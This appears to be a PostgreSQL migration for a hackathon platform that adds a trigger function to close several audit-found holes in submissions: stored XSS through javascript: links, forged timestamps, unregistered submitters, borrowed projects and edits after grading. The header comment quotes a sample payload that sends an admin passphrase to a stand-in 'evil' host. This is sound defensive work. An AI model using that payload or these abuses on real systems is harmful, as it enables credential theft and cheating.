-- Security audit fix (batch 1, item 5): content_url is rendered as a
-- clickable <a href> in both the organizer's grading queue (SubmissionsTab)
-- and the participant's own submission view (DailyChallengePanel). Nothing
-- server-side restricted its scheme, so a submission of
-- content_url = 'javascript:fetch("//evil/?"+localStorage.getItem("forge-admin-passphrase"))'
-- would execute in whichever organizer's browser clicked it while grading —
-- a direct path from an unauthenticated participant submission to admin
-- credential theft. The client now also refuses to render non-http(s) links
-- as clickable (src/lib/utils.ts `isSafeExternalUrl`), but that alone is
-- only a UI-layer guard — this closes it at the actual write boundary so it
-- holds for every current and future render site, and for direct API calls.
CREATE OR REPLACE FUNCTION public.enforce_submission_integrity()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_registered BOOLEAN;
  v_challenge_status TEXT;
  v_project_owner TEXT;
  v_project_code TEXT;
  v_already_finalized BOOLEAN;
BEGIN
  -- Exploit: submitted_at defaults to now() but a client can override it in
  -- the INSERT payload, faking "on time" for a late submission (the Boost
  -- Token gate reads exactly this column). Never trust the client's value.
  IF TG_OP = 'INSERT' THEN
    NEW.submitted_at := now();
  END IF;

  IF NEW.content_url IS NOT NULL AND NEW.content_url !~* '^https?://' THEN
    RAISE EXCEPTION 'Link must start with http:// or https://';
  END IF;

  -- Exploit: nothing previously required the submitter to have registered —
  -- anyone could insert a submission under a made-up email, including for
  -- the express purpose of burning paid Auto-Grade calls on junk.
  SELECT EXISTS (
    SELECT 1 FROM public.hackathon_registrations
    WHERE hackathon_id = NEW.hackathon_id AND participant_email = NEW.participant_email
  ) INTO v_registered;
  IF NOT v_registered THEN
    RAISE EXCEPTION 'You must register for this hackathon before submitting.';
  END IF;

  -- Exploit: a submission could be inserted for a draft (unreleased) or
  -- already-closed challenge, gaming timing or seeing draft content early.
  SELECT status INTO v_challenge_status FROM public.daily_challenges WHERE id = NEW.challenge_id;
  IF v_challenge_status IS DISTINCT FROM 'live' THEN
    RAISE EXCEPTION 'This challenge is not currently open for submissions.';
  END IF;

  -- Exploit: project_id was trusted with no ownership check — participant A
  -- could point their submission at participant B's excellent project and
  -- get graded on B's work. Validate ownership, then snapshot the code so
  -- later edits (by anyone) can't retroactively change what gets graded.
  IF NEW.project_id IS NOT NULL THEN
    SELECT author_email, code INTO v_project_owner, v_project_code FROM public.ai_projects WHERE id = NEW.project_id;
    IF v_project_owner IS NULL OR v_project_owner <> NEW.participant_email THEN
      RAISE EXCEPTION 'You can only link a project you authored.';
    END IF;
    NEW.submitted_code_snapshot := v_project_code;
  END IF;

  -- Exploit: submissions were editable forever, including after grading —
  -- swap in different (or better) work post-score with no re-review.
  IF TG_OP = 'UPDATE' THEN
    SELECT (status = 'finalized') INTO v_already_finalized
    FROM public.submission_scores WHERE submission_id = NEW.id;
    IF v_already_finalized THEN
      RAISE EXCEPTION 'This submission has already been graded and can no longer be edited.';
    END IF;
    NEW.updated_at := now();
  END IF;

  RETURN NEW;
END;
$$;
